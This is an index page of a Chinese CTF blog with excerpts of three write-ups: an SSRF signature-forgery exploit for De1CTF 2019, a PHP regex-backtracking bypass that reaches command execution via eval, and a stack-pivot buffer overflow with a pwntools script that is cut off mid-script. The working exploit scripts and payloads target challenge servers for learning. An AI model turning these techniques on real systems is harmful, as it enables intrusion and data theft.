<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 3 | Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" >De1ctf2019 SSRF Me wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-08
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>打开页面  得到源码 整理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip,</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;scan&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&#x27;Connection Timeout&#x27;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;read&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&#x27;Action Error&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Sign Error&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/geneSign&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    action = <span class="string">&#x27;scan&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&#x27;action&#x27;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&#x27;sign&#x27;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No Hacker!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Connection Timeout&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&#x27;gopher&#x27;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>三个路由：</p>
<ol>
<li><code>/</code> → 展示源码</li>
<li><code>/geneSign</code> → 根据<code>param</code>生成数字签名</li>
<li><code>/De1ta</code> → 在cookie中获取<code>action, sign</code>，并get <code>param</code>（过滤了 gopher 和 file ）  然后新建<code>Task</code>并执行<code>task.Exec</code><ol>
<li><code>21#</code>根据传入的ip生成沙盒文件夹</li>
<li><code>29#</code>根据 param 和 action 检查签名是否有效</li>
<li><code>30#</code>如果 action 中有 <code>scan</code>  则执行 <code>83#</code> ，将结果写入 &#x2F;{sandbox}&#x2F;result.txt </li>
<li><code>40#</code>如果 action 中有 <code>read</code> 则读取 result.txt 并回显</li>
</ol>
</li>
</ol>
<h2 id="0x2-攻击方法"><a href="#0x2-攻击方法" class="headerlink" title="0x2 攻击方法"></a>0x2 攻击方法</h2><p>由于<code>86#</code>urllib.urlopen可以以文件名作为参数打开，尝试scan <code>code.txt</code>然后 read</p>
<p>由于数字签名校验，我们需要先获取sign再向<code>/De1ta</code>发请求    scan方法可以直接通过<code>/geneSign → 63#</code>获取，但是 read 方法不行</p>
<p>且生成需要<code>secret_key</code>（16个随即字节） 不考虑爆破</p>
<p>但同时发现<code>30#</code>和<code>40#</code>判断用的是<code>in</code>而不是<code>is</code>  可能有攻击点  尝试拼接  </p>
<p>很明显  向<code>/De1ta</code>发请求时 <code>action=readscan</code>  这样既会读又会写   向<code>/geneSign</code>请求时只要在param的末尾加上<code>read</code>  这样生成的sign就和<code>53#</code>生成的sign相同  绕过检测</p>
<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/geneSign&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest + <span class="string">&#x27;read&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url=url, params=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/De1ta&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;readscan&#x27;</span>, <span class="string">&#x27;sign&#x27;</span>: <span class="built_in">str</span>(getSign(dest))&#125;</span><br><span class="line">    res = requests.post(url=url, params=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">get_content(dst)</span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;NSSCTF&#123;cbbd7581-79f0-4636-b907-c45578de18f6&#125;\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/08/De1ctf2019-SSRFMe-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/05/NISACTF2022-middlerce-wp/" >NISACTF2022-middlerce-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-05
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>严格正则过滤，尝试PCRE回溯绕过</p>
<blockquote>
<p>具体见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
</blockquote>
<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;system(\&#x27;ls\&#x27;);&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># 回溯得用@^等特殊字符</span></span><br><span class="line">data = &#123; <span class="string">&#x27;letter&#x27;</span>: js &#125;</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28296/&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>但是得到<code>差一点点捏</code>  尝试多次发现system, exec, assert等都被过滤   尝试使用短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>?&gt;闭合了eval自带的&lt;?标签  接下来使用了短标签   <code>&lt;?=</code>相当于<code>&lt;?echo</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># cat, tac, flag都被过滤</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/05/NISACTF2022-middlerce-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" >X-CTF Quals2016 b0verfl0w-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-05
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p>[相关资源](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w)  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>明显栈溢出</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">vul</span></span>() &#123;</span><br><span class="line">  char s[32]; // [esp+18h] [ebp-20h] BYREF</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(s, 50, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>栈上可执行 首先想着就是在s数组中写入shellcode然后跳转到s   但因为aslr栈地址随机化无法知道s的地址  也没有别的后门函数</p>
<p>查看<code>jmp</code>gadget发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only &quot;ret|jmp&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">[...]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="jmp-esp用处"><a href="#jmp-esp用处" class="headerlink" title="jmp esp用处"></a>jmp esp用处</h3><p>当当前函数执行到<code>leave</code>指令后（即<code>mov esp, ebp;pop ebp</code>），esp指向<code>ret addr</code>，接着<code>ret</code>跳转执行 <code>esp = esp + 4; eip = ret addr</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →  | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">↑ esp 									   ↑ esp     eip = 0x11</span><br></pre></td></tr></table></figure>

<p>但如果ret addr处地址为<code>jmp esp</code>的地址  则执行完jmp之后，eip和esp指向同一块位置，也就是接着执行栈上的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →   | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">↑ esp 	                                       ↑ esp   eip = 0x11(jmp esp)</span><br><span class="line">               |------------|------...----|</span><br><span class="line"> ➤ jmp esp ➤   | addr 0x11  |      ...    |</span><br><span class="line">               |------------|------...----|</span><br><span class="line">                            ↑ esp,eip</span><br></pre></td></tr></table></figure>

<p>因此我们可以在ret addr之后写入汇编指令  但是由于只有<code>50 - 32 = 18</code>字节的溢出空间，显然不够写入完整shellcode </p>
<p>但是可以把shellcode写入变量s  在ret addr之后写入<code>sub esp, 0x28;jmp esp</code>   0x20(s) + 0x4(old ebp) + 0x4(ret addr) &#x3D; 0x28</p>
<p>这样子就可以把esp移到变量s的地址，然后跳转执行s里的shellcode</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0804857A</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span 